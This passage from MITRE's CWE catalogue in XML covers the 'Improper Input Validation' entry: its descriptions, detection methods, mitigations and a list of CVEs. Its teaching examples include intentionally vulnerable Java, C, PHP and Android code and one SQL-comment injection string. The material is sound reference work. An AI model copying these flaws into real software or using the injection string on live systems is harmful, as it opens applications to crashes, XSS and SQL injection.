               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2017-11-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Applicable_Platforms, References, Taxonomy_Mappings</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Demonstrative_Examples</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-04-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Research_Gaps</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Detection_Factors, References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
         </ns0:Content_History>
      </ns0:Weakness>
      <ns0:Weakness ID="20" Name="Improper Input Validation" Abstraction="Class" Structure="Simple" Status="Stable">
        <ns0:Description>The product receives input or data, but it does
        not validate or incorrectly validates that the input has the
        properties that are required to process the data safely and
        correctly.</ns0:Description>
         <ns0:Extended_Description>
	   <html:p>Input validation is a frequently-used technique
	   for checking potentially dangerous inputs in order to
	   ensure that the inputs are safe for processing within the
	   code, or when communicating with other components.  When
	   software does not validate input properly, an attacker is
	   able to craft the input in a form that is not expected by
	   the rest of the application. This will lead to parts of the
	   system receiving unintended input, which may result in
	   altered control flow, arbitrary control of a resource, or
	   arbitrary code execution.</html:p>
	   <html:p>Input validation is not the only technique for
	   processing input, however.  Other techniques attempt to
	   transform potentially-dangerous input into something safe, such
	   as filtering (CWE-790) - which attempts to remove dangerous
	   inputs - or encoding/escaping (CWE-116), which attempts to
	   ensure that the input is not misinterpreted when it is included
	   in output to another component. Other techniques exist as well
	   (see CWE-138 for more examples.)</html:p>
	   <html:p>Input validation can be applied to:</html:p>
	   <html:ul>
	     <html:li>raw data - strings, numbers, parameters, file contents, etc.</html:li>
	     <html:li>metadata - information about the raw data, such as headers or size</html:li>
	   </html:ul>
	   <html:p>Data can be simple or structured.  Structured data
	   can be composed of many nested layers, composed of
	   combinations of metadata and raw data, with other simple or
	   structured data.</html:p>
	   <html:p>Many properties of raw data or metadata may need
	   to be validated upon entry into the code, such
	   as:</html:p>
	   <html:ul>
	     <html:li>specified quantities such as size, length, frequency, price, rate, number of operations, time, etc.</html:li>
	     <html:li>implied or derived quantities, such as the actual size of a file instead of a specified size</html:li>
	     <html:li>indexes, offsets, or positions into more complex data structures</html:li>
	     <html:li>symbolic keys or other elements into hash tables, associative arrays, etc.</html:li>
	     <html:li>well-formedness, i.e. syntactic correctness - compliance with expected syntax </html:li>
	     <html:li>lexical token correctness - compliance with rules for what is treated as a token</html:li>
	     <html:li>specified or derived type - the actual type of the input (or what the input appears to be)</html:li>
	     <html:li>consistency - between individual data elements, between raw data and metadata, between references, etc.</html:li>
	     <html:li>conformance to domain-specific rules, e.g. business logic </html:li>
	     <html:li>equivalence - ensuring that equivalent inputs are treated the same</html:li>
	     <html:li>authenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the data</html:li>
	   </html:ul>
	   <html:p>Implied or derived properties of data must often
	   be calculated or inferred by the code itself.  Errors in
	   deriving properties may be considered a contributing factor
	   to improper input validation.
	   </html:p>
	   <html:p>Note that "input validation" has very different
	   meanings to different people, or within different
	   classification schemes.  Caution must be used when
	   referencing this CWE entry or mapping to it.  For example,
	   some weaknesses might involve inadvertently giving control
	   to an attacker over an input when they should not be able
	   to provide an input at all, but sometimes this is referred
	   to as input validation.</html:p>
	   <html:p>Finally, it is important to emphasize that the
	   distinctions between input validation and output escaping
	   are often blurred, and developers must be careful to
	   understand the difference, including how input validation
	   is not always sufficient to prevent vulnerabilities,
	   especially when less stringent data types must be
	   supported, such as free-form text. Consider a SQL injection
	   scenario in which a person's last name is inserted into a
	   query. The name "O'Reilly" would likely pass the validation
	   step since it is a common last name in the English
	   language. However, this valid name cannot be directly
	   inserted into the database because it contains the "'"
	   apostrophe character, which would need to be escaped or
	   otherwise transformed. In this case, removing the
	   apostrophe might reduce the risk of SQL injection, but it
	   would produce incorrect behavior because the wrong name
	   would be recorded.</html:p>
       </ns0:Extended_Description>
         <ns0:Related_Weaknesses>
            <ns0:Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="PeerOf" CWE_ID="345" View_ID="1000" Ordinal="Primary" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="22" View_ID="1000" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="41" View_ID="1000" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="74" View_ID="1000" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="119" View_ID="1000" />
            <ns0:Related_Weakness Nature="CanPrecede" CWE_ID="770" View_ID="1000" />
         </ns0:Related_Weaknesses>
         <ns0:Applicable_Platforms>
            <ns0:Language Class="Not Language-Specific" Prevalence="Often" />
         </ns0:Applicable_Platforms>
         <ns0:Modes_Of_Introduction>
            <ns0:Introduction>
               <ns0:Phase>Architecture and Design</ns0:Phase>
            </ns0:Introduction>
            <ns0:Introduction>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Note>
                  <html:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</html:p>
                  <html:p>If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602).</html:p>
               </ns0:Note>
            </ns0:Introduction>
         </ns0:Modes_Of_Introduction>
         <ns0:Likelihood_Of_Exploit>High</ns0:Likelihood_Of_Exploit>
         <ns0:Common_Consequences>
            <ns0:Consequence>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>DoS: Crash, Exit, or Restart</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (CPU)</ns0:Impact>
               <ns0:Impact>DoS: Resource Consumption (Memory)</ns0:Impact>
               <ns0:Note>An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Impact>Read Memory</ns0:Impact>
               <ns0:Impact>Read Files or Directories</ns0:Impact>
               <ns0:Note>An attacker could read confidential data if they are able to control resource references.</ns0:Note>
            </ns0:Consequence>
            <ns0:Consequence>
               <ns0:Scope>Integrity</ns0:Scope>
               <ns0:Scope>Confidentiality</ns0:Scope>
               <ns0:Scope>Availability</ns0:Scope>
               <ns0:Impact>Modify Memory</ns0:Impact>
               <ns0:Impact>Execute Unauthorized Code or Commands</ns0:Impact>
               <ns0:Note>An attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution.</ns0:Note>
            </ns0:Consequence>
         </ns0:Common_Consequences>
         <ns0:Detection_Methods>
            <ns0:Detection_Method Detection_Method_ID="DM-3">
               <ns0:Method>Automated Static Analysis</ns0:Method>
               <ns0:Description>
                  <html:p>Some instances of improper input validation can be detected using automated static analysis.</html:p>
                  <html:p>A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</html:p>
                  <html:p>Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</html:p>
               </ns0:Description>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-4">
               <ns0:Method>Manual Static Analysis</ns0:Method>
               <ns0:Description>When custom input validation is required, such as when enforcing business rules, manual analysis is necessary to ensure that the validation is properly implemented.</ns0:Description>
            </ns0:Detection_Method>
            <ns0:Detection_Method Detection_Method_ID="DM-5">
               <ns0:Method>Fuzzing</ns0:Method>
               <ns0:Description>Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself.</ns0:Description>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                           <html:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Binary or Bytecode</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>SOAR Partial</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Automated Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Web Application Scanner</html:li>
                           <html:li>Web Services Scanner</html:li>
                           <html:li>Database Scanners</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Dynamic Analysis with Manual Results Interpretation</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Fuzz Tester</html:li>
                           <html:li>Framework-based Fuzzer</html:li>
                        </html:ul>
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Host Application Interface Scanner</html:li>
                           <html:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Manual Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Focused Manual Spotcheck - Focused manual analysis of source</html:li>
                           <html:li>Manual Source Code Review (not inspections)</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Automated Static Analysis - Source Code</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Source code Weakness Analyzer</html:li>
                           <html:li>Context-configured Source Code Weakness Analyzer</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
            <ns0:Detection_Method>
               <ns0:Method>Architecture or Design Review</ns0:Method>
               <ns0:Description>
                  <html:p>According to SOAR, the following detection techniques may be useful:</html:p>
                  <html:div style="margin-left:1em;">
                     <html:div>Highly cost effective:</html:div>
                        <html:ul>
                           <html:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</html:li>
                           <html:li>Formal Methods / Correct-By-Construction</html:li>
                        </html:ul>
                     <html:div>Cost effective for partial coverage:</html:div>
                        <html:ul>
                           <html:li>Attack Modeling</html:li>
                        </html:ul>
                  </html:div>
               </ns0:Description>
               <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Detection_Method>
         </ns0:Detection_Methods>
         <ns0:Potential_Mitigations>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Attack Surface Reduction</ns0:Strategy>
               <ns0:Description>Consider using language-theoretic security (LangSec) techniques that characterize inputs using a formal language and build "recognizers" for that language.  This effectively requires parsing to be a distinct layer that effectively enforces a boundary between raw input and internal data representations, instead of allowing parser code to be scattered throughout the program, where it could be subject to errors or inconsistencies that create weaknesses. [REF-1109] [REF-1110] [REF-1111]</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-7">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Strategy>Libraries or Frameworks</ns0:Strategy>
               <ns0:Description>Use an input validation framework such as Struts or the OWASP ESAPI Validation API. Note that using a framework does not automatically address all input validation problems; be mindful of weaknesses that could arise from misusing the framework itself (CWE-1173).</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-6">
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Strategy>Attack Surface Reduction</ns0:Strategy>
               <ns0:Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-5">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Strategy>Input Validation</ns0:Strategy>
               <ns0:Description>
                  <html:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</html:p>
                  <html:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</html:p>
                  <html:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</html:p>
               </ns0:Description>
	       <ns0:Effectiveness>High</ns0:Effectiveness>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Architecture and Design</ns0:Phase>
               <ns0:Description>
                  <html:p>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</html:p>
                  <html:p>Even though client-side checks provide minimal benefits with respect to server-side security, they are still useful. First, they can support intrusion detection. If the server receives input that should have been rejected by the client, then it may be an indication of an attack. Second, client-side error-checking can provide helpful feedback to the user about the expectations for valid input. Third, there may be a reduction in server-side processing time for accidental input errors, although this is typically a small savings.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>When your application combines data from multiple sources, perform the validation after the sources have been combined. The individual data elements may pass the validation step but violate the intended restrictions after they have been combined.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation Mitigation_ID="MIT-35">
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Be especially careful to validate all input when invoking code that crosses language boundaries, such as from an interpreted language to native code. This could create an unexpected interaction between the language boundaries. Ensure that you are not violating any of the expectations of the language with which you are interfacing. For example, even though Java may not be susceptible to buffer overflows, providing a large argument in a call to native code might trigger an overflow.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.</ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>
                  <html:p>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180, CWE-181). Make sure that your application does not inadvertently decode the same input twice (CWE-174). Such errors could be used to bypass allowlist schemes by introducing dangerous inputs after they have been checked. Use libraries such as the OWASP ESAPI Canonicalization control.</html:p>
                  <html:p>Consider performing repeated canonicalization until your input does not change any more. This will avoid double-decoding and similar scenarios, but it might inadvertently modify inputs that are allowed to contain properly-encoded dangerous content.</html:p>
               </ns0:Description>
            </ns0:Mitigation>
            <ns0:Mitigation>
               <ns0:Phase>Implementation</ns0:Phase>
               <ns0:Description>When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.</ns0:Description>
            </ns0:Mitigation>
         </ns0:Potential_Mitigations>
         <ns0:Demonstrative_Examples>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-135">
               <ns0:Intro_Text>This example demonstrates a shopping interaction in which the user is free to specify the quantity of items to be purchased and a total is calculated.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>...<html:br />public static final double price = 20.00;<html:br />int quantity = currentUser.getAttribute("quantity");<html:br />double total = price * quantity;<html:br />chargeUser(total);<html:br />...</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>The user has no control over the price variable, however the code does not prevent a negative value from being specified for quantity. If an attacker were to provide a negative value, then the user would have their account credited instead of debited.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-136">
               <ns0:Intro_Text>This example asks the user for a height and width of an m X n game board with a maximum dimension of 100 squares.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="C">
                  <html:div>...<html:br />#define MAX_DIM 100<html:br />...<html:br />
                     <html:i>/* board dimensions */</html:i>
                     <html:br />
                     <html:br />int m,n, error;<html:br />board_square_t *board;<html:br />printf("Please specify the board height: \n");<html:br />error = scanf("%d", &amp;m);<html:br />if ( EOF == error ){<html:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</html:div>}<html:br />printf("Please specify the board width: \n");<html:br />error = scanf("%d", &amp;n);<html:br />if ( EOF == error ){<html:div style="margin-left:1em;">die("No integer passed: Die evil hacker!\n");</html:div>}<html:br />if ( m &gt; MAX_DIM || n &gt; MAX_DIM ) {<html:div style="margin-left:1em;">die("Value too large: Die evil hacker!\n");</html:div>}<html:br />board = (board_square_t*) malloc( m * n * sizeof(board_square_t));<html:br />...</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>While this code checks to make sure the user cannot specify large, positive integers and consume too much memory, it does not check for negative values supplied by the user. As a result, an attacker can perform a resource consumption (CWE-400) attack against this program by specifying two, large negative values that will not overflow, resulting in a very large memory allocation (CWE-789) and possibly a system crash. Alternatively, an attacker can provide very large negative values which will cause an integer overflow (CWE-190) and unexpected behavior will follow depending on how the values are treated in the remainder of the program.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example>
               <ns0:Intro_Text>The following example shows a PHP application in which the programmer attempts to display a user's birthday and homepage.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="PHP">
                  <html:div>$birthday = $_GET['birthday'];<html:br />$homepage = $_GET['homepage'];<html:br />echo "Birthday: $birthday&lt;br&gt;Homepage: &lt;a href=$homepage&gt;click here&lt;/a&gt;"</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>The programmer intended for $birthday to be in a date format and $homepage to be a valid URL. However, since the values are derived from an HTTP request, if an attacker can trick a victim into clicking a crafted URL with &lt;script&gt; tags providing the values for birthday and / or homepage, then the script will run on the client's browser when the web server echoes the content. Notice that even if the programmer were to defend the $birthday variable by restricting input to integers and dashes, it would still be possible for an attacker to provide a string of the form:</ns0:Body_Text>
               <ns0:Example_Code Nature="Attack">
                  <html:div>2009-01-09--</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>If this data were used in a SQL statement, it would treat the remainder of the statement as a comment. The comment could disable other security-related logic in the statement. In this case, encoding combined with input validation would be a more useful protection mechanism.</ns0:Body_Text>
               <ns0:Body_Text>Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just a few of the potential consequences when input validation is not used. Depending on the context of the code, CRLF Injection (CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may also be possible.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-34">
               <ns0:Intro_Text>The following example takes a user-supplied value to allocate an array of objects and then operates on the array.</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>private void buildList ( int untrustedListSize ){<html:div style="margin-left:1em;">if ( 0 &gt; untrustedListSize ){<html:div style="margin-left:1em;">die("Negative value supplied for list size, die evil hacker!");</html:div>}<html:br />Widget[] list = new Widget [ untrustedListSize ];<html:br />list[0] = new Widget();</html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>This example attempts to build a list from a user-specified value, and even checks to ensure a non-negative value is supplied. If, however, a 0 value is provided, the code will build an array of size 0 and then try to store a new Widget in the first location, causing an exception to be thrown.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
            <ns0:Demonstrative_Example Demonstrative_Example_ID="DX-110">
               <ns0:Intro_Text>This Android application has registered to handle a URL when sent an intent:</ns0:Intro_Text>
               <ns0:Example_Code Nature="Bad" Language="Java">
                  <html:div>
                     <html:br />
                     <html:i>...</html:i>
                     <html:br />IntentFilter filter = new IntentFilter("com.example.URLHandler.openURL");<html:br />MyReceiver receiver = new MyReceiver();<html:br />registerReceiver(receiver, filter);<html:br />
                     <html:i>...</html:i>
                     <html:br />
                     <html:br />public class UrlHandlerReceiver extends BroadcastReceiver {<html:div style="margin-left:1em;">
                        <html:div>@Override<html:br />public void onReceive(Context context, Intent intent) {<html:div style="margin-left:1em;">
                              <html:div>if("com.example.URLHandler.openURL".equals(intent.getAction())) {<html:div style="margin-left:1em;">String URL = intent.getStringExtra("URLToOpen");<html:br />int length = URL.length();</html:div>
                                 <html:br />
                                 <html:i>...</html:i>
                                 <html:br />}</html:div>
                           </html:div>}</html:div>
                     </html:div>}</html:div>
               </ns0:Example_Code>
               <ns0:Body_Text>The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called.</ns0:Body_Text>
            </ns0:Demonstrative_Example>
         </ns0:Demonstrative_Examples>
         <ns0:Observed_Examples>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-30860</ns0:Reference>
               <ns0:Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-30860</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-30663</ns0:Reference>
               <ns0:Description>Chain: improper input validation (CWE-20) leads to integer overflow (CWE-190) in mobile OS, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-30663</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-22205</ns0:Reference>
               <ns0:Description>Chain: backslash followed by a newline can bypass a validation step (CWE-20), leading to eval injection (CWE-95), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-22205</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2021-21220</ns0:Reference>
               <ns0:Description>Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-21220</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-9054</ns0:Reference>
               <ns0:Description>Chain: improper input validation (CWE-20) in username parameter, leading to OS command injection (CWE-78), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-9054</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-3452</ns0:Reference>
               <ns0:Description>Chain: security product has improper input validation (CWE-20) leading to directory traversal (CWE-22), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-3452</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-3161</ns0:Reference>
               <ns0:Description>Improper input validation of HTTP requests in IP phone, as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-3161</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2020-3580</ns0:Reference>
               <ns0:Description>Chain: improper input validation (CWE-20) in firewall product leads to XSS (CWE-79), as exploited in the wild per CISA KEV.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2020-3580</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
            <ns0:Reference>CVE-2021-37147</ns0:Reference>
            <ns0:Description>Chain: caching proxy server has improper input validation (CWE-20) of headers, allowing HTTP response smuggling (CWE-444) using an "LF line ending"</ns0:Description>
            <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2021-37147</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-5305</ns0:Reference>
               <ns0:Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-5305</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-2223</ns0:Reference>
               <ns0:Description>SQL injection through an ID that was supposed to be numeric.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-2223</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3477</ns0:Reference>
               <ns0:Description>lack of input validation in spreadsheet program leads to buffer overflows, integer overflows, array index errors, and memory corruption.</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3477</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3843</ns0:Reference>
               <ns0:Description>insufficient validation enables XSS</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3843</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2008-3174</ns0:Reference>
               <ns0:Description>driver in security product allows code execution due to insufficient validation</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2008-3174</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2007-3409</ns0:Reference>
               <ns0:Description>infinite loop from DNS packet with a label that points to itself</ns0:Description>
               <ns0:Link>https://www.cve.org/CVERecord?id=CVE-2007-3409</ns0:Link>
            </ns0:Observed_Example>
            <ns0:Observed_Example>
               <ns0:Reference>CVE-2006-6870</ns0:Reference>
